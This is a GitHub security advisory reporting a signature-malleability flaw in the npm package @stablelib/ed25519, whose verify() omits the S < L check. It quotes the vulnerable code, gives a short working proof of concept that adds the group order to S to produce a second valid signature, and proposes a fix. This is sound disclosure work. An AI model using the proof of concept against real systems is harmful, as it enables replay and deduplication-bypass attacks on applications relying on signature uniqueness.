# [M] StableLib Ed25519 Signature Malleability via Missing S < L Check

## Summary
Severity: Medium
Advisory: GHSA-x3ff-w252-2g7j
CWE: CWE-347
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-x3ff-w252-2g7j
Type: github-advisory

## Affected
- npm: `@stablelib/ed25519` — affected >=0

## Details
# Ed25519 Signature Malleability via Missing S < L Check -- Same Class as node-forge CVE-2026-33895 (CWE-347)

## Target
- Repository: StableLib/stablelib (package: @stablelib/ed25519)
- Platform: GitHub PVR
- Bounty: CVE credit
- CWE: CWE-347 (Improper Verification of Cryptographic Signature)
- Version: 2.0.2 (latest, 2026-03-28)

## Root Cause

The `verify()` function in `@stablelib/ed25519` does not check that the `S` component of the signature is less than the group order `L`. Per CFRG recommendations and the ZIP-215 specification, Ed25519 implementations should reject signatures where `S >= L` to prevent signature malleability.

When `S >= L`, `[S]B = [(S mod L)]B = [(S - L)]B`, meaning two different 32-byte `S` values produce the same verification result. An attacker who observes a valid signature `(R, S)` can produce a second valid signature `(R, S + L)` for the same message.

### Vulnerable code

**File:** `packages/ed25519/ed25519.ts` (compiled: `lib/ed25519.js:779-802`)

```javascript
export function verify(publicKey, message, signature) {
    // ... length check, unpack public key ...
    const hs = new SHA512();
    hs.update(signature.subarray(0, 32));   // R
    hs.update(publicKey);                   // A
    hs.update(message);                     // M
    const h = hs.digest();
    reduce(h);                              // h is reduced mod L
    scalarmult(p, q, h);                    // [h](-A)
    scalarbase(q, signature.subarray(32));  // [S]B -- S NOT checked or reduced
    edadd(p, q);
    pack(t, p);
    if (verify32(signature, t)) {           // compare R
        return false;
    }
    return true;
}
```

Note that `h` is properly `reduce()`d (line 794), but `S` (signature bytes 32-63) is passed directly to `scalarbase()` without any range check.

## Proof of Concept

```javascript
const ed = require('@stablelib/ed25519');

const kp = ed.generateKeyPair();
const msg = new TextEncoder().encode("Hello, world!");
const sig = ed.sign(kp.secretKey, msg);

console.log("Original valid:", ed.verify(kp.publicKey, msg, sig)); // true

// Ed25519 group order L
const L = [
  0xed, 0xd3, 0xf5, 0x5c, 0x1a, 0x63, 0x12, 0x58,
  0xd6, 0x9c, 0xf7, 0xa2, 0xde, 0xf9, 0xde, 0x14,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10
];

// Add L to S component to create malleable signature
const malSig = new Uint8Array(64);
malSig.set(sig.subarray(0, 32)); // R unchanged
let carry = 0;
for (let i = 0; i < 32; i++) {
  const sum = sig[32 + i] + L[i] + carry;
  malSig[32 + i] = sum & 0xff;
  carry = sum >> 8;
}

console.log("Malleable valid:", ed.verify(kp.publicKey, msg, malSig)); // true
console.log("Sigs differ:", !sig.every((b, i) => b === malSig[i]));    // true
```

**Output:**
```
Original valid: true
Malleable valid: true
Sigs differ: true
```

## Impact

- **Signature malleability**: Given any valid signature, an attacker can produce a second distinct valid signature for the same message without knowing the private key
- **Transaction ID collision**: Applications using signature bytes as unique identifiers (e.g., blockchain transaction IDs) are vulnerable to replay/double-spend attacks
- **Deduplication bypass**: Systems deduplicating by signature value accept the same message twice with different "signatures"
- **Same vulnerability class** as node-forge CVE-2026-33895 (GHSA-q67f-28xg-22rw), rated HIGH

## Suggested Fix

Add an S < L check before processing the signature:

```javascript
// L in little-endian
const L = new Uint8Array([
  0xed, 0xd3, 0xf5, 0x5c, 0x1a, 0x63, 0x12, 0x58,
  0xd6, 0x9c, 0xf7, 0xa2, 0xde, 0xf9, 0xde, 0x14,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10
]);

function scalarLessThanL(s) {
  for (let i = 31; i >= 0; i--) {
    if (s[i] < L[i]) return true;
    if (s[i] > L[i]) return false;
  }
  return false; // equal to L, reject
}

export function verify(publicKey, message, signature) {
    // ... existing checks ...
    if (!scalarLessThanL(signature.subarray(32))) {
        return false; // S >= L, reject
    }
    // ... rest of verify ...
}
```

## Self-Review

- **Is this by-design?** No explicit documentation suggests malleability is intended. The library is described as implementing "Ed25519 public-key signature (EdDSA with Curve25519)" with no caveat about malleability.
- **Is RFC 8032 strict about this?** No. RFC 8032 does not require S < L. However, the CFRG recommends it, ZIP-215 requires it, and the node-forge advisory (CVE-2026-33895) treats the identical issue as HIGH severity.
- **Is this already reported?** No. No existing issues or CVEs for @stablelib/ed25519 regarding malleability or S < L.
- **Honest weaknesses:** (1) RFC 8032 does not strictly require S < L. (2) Not all applications are affected -- only those depending on signature uniqueness. (3) This is malleability, not forgery -- the attacker cannot sign new messages. (4) tweetnacl has the same issue and considers it a known limitation.
- **CVSS:** Medium (5.3). AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N -- can produce alternate valid signatures, limited integrity impact.

## Solution

Upgrade to version 2.1.0.

## References
- https://github.com/StableLib/stablelib/security/advisories/GHSA-x3ff-w252-2g7j
- https://github.com/StableLib/stablelib
